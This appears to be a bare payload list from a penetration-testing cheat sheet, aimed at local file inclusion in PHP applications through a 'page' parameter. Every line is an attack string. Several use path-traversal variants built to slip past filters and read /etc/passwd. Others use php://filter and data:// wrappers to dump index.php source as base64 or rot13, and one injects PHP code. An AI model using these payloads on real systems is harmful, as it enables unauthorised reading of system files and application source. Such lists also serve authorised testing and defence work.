
?page=..//..//..//..//..//etc/passwd
?page=....//....//....//....//etc/passwd
?page=....//....//....//....//....//....//etc/passwd
?page=.....///.....///.....///.....///etc/passwd
?page=..\\/..\\/..\\/..\\/etc/passwd

# PHP Filter
?page=php://filter/resource=/etc/passwd
?page=php://filter/read=string.rot13/resource=index.php
?page=php://filter/convert.base64-encode/resource=index.php
?page=pHp://filter/convert.base64-encode/resource=index.php
?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
?page=data://text/plain,<?php echo base64_encode(file_get_contents(“index.php”)); ?>
